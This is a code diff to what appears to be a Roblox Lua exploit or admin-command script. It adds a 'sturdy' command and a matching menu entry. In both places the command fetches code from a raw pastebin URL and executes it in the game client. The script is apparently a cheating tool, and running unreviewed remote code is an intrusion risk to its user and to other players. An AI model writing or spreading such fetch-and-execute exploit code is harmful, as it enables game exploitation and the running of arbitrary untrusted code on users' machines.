@@ -6650,6 +6650,16 @@ wait(0.5)
 game.Workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
 game.Workspace.CurrentCamera.CameraType = "Custom"
 end
+if cmd == "sturdy" then
+local respon, result = pcall(function()
+ForceBodyPart()
+executeHTTPS("https://pastebin.com/raw/sfH0d8RW")
+end)
+
+if not respon then
+ErrorPrompt("FE Sturdy Error", result, "close")
+end
+end
 -- limit
 end
 end
@@ -9003,6 +9013,16 @@ wait(0.5)
 game.Workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
 game.Workspace.CurrentCamera.CameraType = "Custom"
 end
+if cmd == "sturdy" then
+local respon, result = pcall(function()
+ForceBodyPart()
+executeHTTPS("https://pastebin.com/raw/sfH0d8RW")
+end)
+
+if not respon then
+ErrorPrompt("FE Sturdy Error", result, "close")
+end
+end
 -- limits
 end
 end)
@@ -9195,6 +9215,7 @@ cmds[#cmds + 1] = {Text = "[180] " .. tostring(prefix) .. "nofog",Title = "remov
 cmds[#cmds + 1] = {Text = "[181] " .. tostring(prefix) .. "maxzoom [number]",Title = "set camera maxzoom distance"}
 cmds[#cmds + 1] = {Text = "[182] " .. tostring(prefix) .. "minzoom [number]",Title = "set camera minzoom distance"}
 cmds[#cmds + 1] = {Text = "[183] " .. tostring(prefix) .. "fixcam",Title = "fix ur camera"}
+cmds[#cmds + 1] = {Text = "[184] " .. tostring(prefix) .. "sturdy",Title = "Get Sturdy"}
 
 for v = 1, #cmds do
 -- for _,v in next, #cmds do
